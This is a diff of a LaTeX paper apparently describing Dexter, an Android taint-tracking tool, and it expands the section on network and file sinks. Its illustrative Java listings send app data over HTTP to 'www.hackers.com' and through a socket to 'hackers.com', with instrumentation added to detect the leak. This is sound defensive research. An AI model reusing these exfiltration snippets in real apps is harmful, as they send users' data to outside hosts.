@@ -280,7 +280,7 @@ For the sake of simplicity, Dexter adopts the same tag representation as TaintDr
 		5            & \verb$TAINT_SOURCE_DEVICE_ID$ & device ID, e.g. IMEI/phone number \\
 		\hline
 		29           & \verb$TAINT_SINK_FILE$        & file-system sink \\
-		30           & \verb$TAINT_SINK_NET$         & network sink \\
+		30           & \verb$TAINT_SINK_SOCKET$      & network sink \\
 		31           & \verb$TAINT_SINK_OUT$         & standard console output sink \\
 		\lasthline
 	\end{tabular}
@@ -650,41 +650,109 @@ while (cursor.moveToNext()) {
 
 \subsection{Sinks}
 
-\subsubsection{API Calls}
+The aim of sink instrumentation is to check whether specific API methods, which are known to transfer data out of the application, are called with tainted arguments. Sinks were divided into two groups based on the required approach.
+
+In the following code examples, the \verb$TAINT_SOURCE$ and \verb$TAINT_SINK$ constants will be used. These are bit masks that correspond to the regions of taint tags reserved for source and sink flags (see table~\ref{table:TaintTagStorage_BitMeaning}).
+
+\subsubsection{Always-leaking API Calls}
+
+Most tracked API calls are easy to handle, because they always leak the data passed to them. Those that were implemented are listed in table~\ref{table:Sinks_AlwaysLeaking}, but more could easily be added.
+
+\begin{table}[h]
+	\begin{center}
+	\begin{tabular}{|l|l|}
+		\firsthline
+		\textbf{Name}         & \textbf{Tracked Methods} \\
+		\hline
+		System logging        & \verb$Log.d$, \verb$Log.v$, \verb$Log.i$, ... \\
+		Android IPC           & \verb$Context.sendBroadcast$ and similar \\
+		Apache HTTP Client    & \verb$HttpClient.execute$ \\
+		\lasthline
+	\end{tabular}
+	\end{center}
+	\caption{Always-leaking sinks supported by Dexter}
+	\label{table:Sinks_AlwaysLeaking}
+\end{table}
+
+Listing~\ref{listing:Sink_ApacheHTTPClient} shows a piece of code that sends data to a remote server using the Apache HTTP Client, which is included in the Android framework. Thanks to taint propagation rules, \verb$post$ inherits the taint of \verb$data$, and thus, once the \verb$execute$ method is called, all that is left to do is to check whether its tag is non-zero, in which case the user needs to be warned.
 
 \begin{figure}[h]
 	\centering
 	\begin{tabular}{c}
 	\begin{lstlisting}
-String data = getSensitiveData();
-List<NameValuePair> pairs = Arrays.asList(new BasicNameValuePair("postedData", data));
+String data = getSomeData();
+List<NameValuePair> pairs = Arrays.asList(new BasicNameValuePair("x", data));
 HttpEntity postData = new UrlEncodedFormEntity(pairs);
 HttpPost post = new HttpPost("http://www.hackers.com/");
 post.setEntity(postData);
 DefaultHttpClient client = new DefaultHttpClient();
-client.execute(post); // check this	
+
+`\hl{if ((TaintMap.get(post) \& TAINT\_SOURCE) != 0) \{}`
+`\hl{ // warn the user}`
+`\hl{\}}`
+
+client.execute(post);
 	\end{lstlisting}
 	\end{tabular}
-	\begin{lstlisting}[caption={Accessing browser bookmarks},
+	\begin{lstlisting}[caption={HTTP request using the Apache client, with sink instrumentation},
 	                   label={listing:Sink_ApacheHTTPClient}]
 	\end{lstlisting}
 \end{figure}
 
 \subsubsection{Writer Interface}
 
+Unfortunately, situation is more complicated for some of the sinks we want to support, namely I/O build around the \verb$Writer$ interface. Listing~\ref{listing:Sink_Socket} shows typical usage of the interface for network communication. The tracked method is \verb$PrintWriter.println$, but checking only the taint of the argument is insufficient. In listing~\ref{listing:Sink_ByteArray}, \verb$Writer$ is created with a \verb$ByteArrayOutputStream$, does not form a sink, and we merely want the taint to propagate into \verb$array$. 
+
+We handle this by setting a flag inside the \verb$Socket$ object's taint tag when it is initialized, i.e. making the \verb$Socket.<init>$ method a source of \verb$TAINT_SINK_SOCKET$ data. This taint propagates into the output stream and eventually into the \verb$Writer$ object. Code inserted for the \verb$println$ method then checks whether the object it is called on carries a sink taint, and only proceeds to checking the taint of the argument if it does.
+
 \begin{figure}[h]
 	\centering
 	\begin{tabular}{c}
 	\begin{lstlisting}
-String data = getSensitiveData();
-Socket s = new Socket("hackers.com", 1234); // TAINT_SINK_NET
-PrintWriter outNet = new PrintWriter(s.getOutputStream(), true);
-outNet.println(data);
-outNet.close();
+String data = getSomeData();
+Socket socket = new Socket("hackers.com", 1234);
+
+`\hl{TaintMap.set(TAINT\_SINK\_SOCKET, socket); }`
+
+OutputStream sos = socket.getOutputStream();
+PrintWriter writer = new PrintWriter(sos);
+
+`\hl{if ((TaintMap.get(writer) \& TAINT\_SINK) != 0) \{ }`
+`\hl{~~if ((TaintMap.get(data) \& TAINT\_SOURCE) != 0) \{ }`
+`\hl{~~~~// warn the user}`
+`\hl{~~\}}`
+`\hl{\}}`
+
+writer.println(data);
+writer.close();
 	\end{lstlisting}
 	\end{tabular}
-	\begin{lstlisting}[caption={Accessing browser bookmarks},
+	\begin{lstlisting}[caption={Writer interface used for network communication, with sink instrumentation.},
 	                   label={listing:Sink_Socket}]
+	\end{lstlisting}
+\end{figure}
+
+\begin{figure}[h]
+	\centering
+	\begin{tabular}{c}
+	\begin{lstlisting}
+String data = getSomeData();
+ByteArrayOutputStream baos = new ByteArrayOutputStream();
+PrintWriter writer = new PrintWriter(baos);
+
+`\hl{if ((TaintMap.get(writer) \& TAINT\_SINK) != 0) \{ }`
+`\hl{~~if ((TaintMap.get(data) \& TAINT\_SOURCE) != 0) \{ }`
+`\hl{~~~~// warn the user}`
+`\hl{~~\}}`
+`\hl{\}}`
+
+writer.println(data);
+writer.close();
+byte[] array = baos.toByteArray();
+	\end{lstlisting}
+	\end{tabular}
+	\begin{lstlisting}[caption={Writer interface used to turn data into a byte array, with sink instrumentation.},
+	                   label={listing:Sink_ByteArray}]
 	\end{lstlisting}
 \end{figure}
 
